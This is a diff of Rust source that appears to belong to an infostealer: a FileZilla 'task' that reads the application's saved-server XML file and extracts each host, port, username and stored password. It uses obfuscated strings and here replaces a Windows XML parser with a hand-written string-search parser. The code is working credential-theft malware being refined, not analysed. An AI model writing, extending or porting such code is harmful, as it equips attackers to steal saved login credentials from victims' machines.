@@ -35,8 +35,6 @@ use filesystem::{FileSystem, WriteTo};
 use obfstr::obfstr as s;
 use tasks::Task;
 use utils::base64::base64_decode;
-use windows::Data::Xml::Dom::XmlDocument;
-use windows::core::HSTRING;
 
 pub struct FileZillaTask;
 
@@ -107,7 +105,7 @@ fn collect_servers() -> Vec<Server> {
 fn collect_servers_from_path<F, S>(
     filesystem: &F,
     path: &Path,
-    servers_node: S,
+    _servers_node: S,
 ) -> Option<Vec<Server>>
 where
     S: AsRef<str>,
@@ -119,51 +117,54 @@ where
         return None;
     }
 
-    let bytes = filesystem.read_file(path);
-
-    if bytes.is_err() {
-        return None;
-    }
-
-    let bytes = bytes.ok()?;
+    let bytes = filesystem.read_file(path).ok()?;
     let content = String::from_utf8(bytes).ok()?;
-    let content = HSTRING::from(content.as_str());
 
-    let xml_doc = XmlDocument::new().ok()?;
-    xml_doc.LoadXml(&content).ok()?;
+    // Simple XML parsing using string search
+    let mut pos = 0;
+    while let Some(server_start) = content[pos..].find("<Server>") {
+        let server_start = pos + server_start;
+        if let Some(server_end) = content[server_start..].find("</Server>") {
+            let server_end = server_start + server_end;
+            let server_xml = &content[server_start..server_end];
 
-    let root = xml_doc.DocumentElement().ok()?;
-    let servers = root
-        .SelectSingleNode(&HSTRING::from(servers_node.as_ref()))
-        .ok()?;
+            let get_text = |name: &str| -> String {
+                let start_tag = format!("<{}>", name);
+                let end_tag = format!("</{}>", name);
+                if let Some(start) = server_xml.find(&start_tag) {
+                    let content_start = start + start_tag.len();
+                    if let Some(end) = server_xml[content_start..].find(&end_tag) {
+                        return server_xml[content_start..content_start + end].to_owned();
+                    }
+                }
+                String::new()
+            };
 
-    let nodes = servers.SelectNodes(&HSTRING::from(s!("Server"))).ok()?;
+            let host = get_text(s!("Host"));
+            let port = get_text(s!("Port")).parse::<u16>().unwrap_or(0);
+            let user = get_text(s!("User"));
+            let password = get_text(s!("Pass"));
 
-    for i in 0..nodes.Length().ok()? {
-        let server = nodes.Item(i).ok()?;
-
-        let get_text = |name: &str| -> Option<String> {
-            if let Ok(child) = server.SelectSingleNode(&HSTRING::from(name)) {
-                Some(child.InnerText().ok()?.to_string_lossy())
-            } else {
-                Some(String::new())
+            if !host.is_empty() {
+                result.push(Server {
+                    host,
+                    port,
+                    user,
+                    password,
+                });
             }
-        };
 
-        let host = get_text(s!("Host"))?;
-        let port = get_text(s!("Port"))?.parse::<u16>().unwrap_or(0);
-        let user = get_text(s!("User"))?;
-        let password = get_text(s!("Pass"))?;
-
-        result.push(Server {
-            host,
-            port,
-            user,
-            password,
-        })
+            pos = server_end + 9; // Move past </Server>
+        } else {
+            break;
+        }
     }
 
-    Some(result)
+    if result.is_empty() {
+        None
+    } else {
+        Some(result)
+    }
 }
 
 #[derive(PartialEq)]
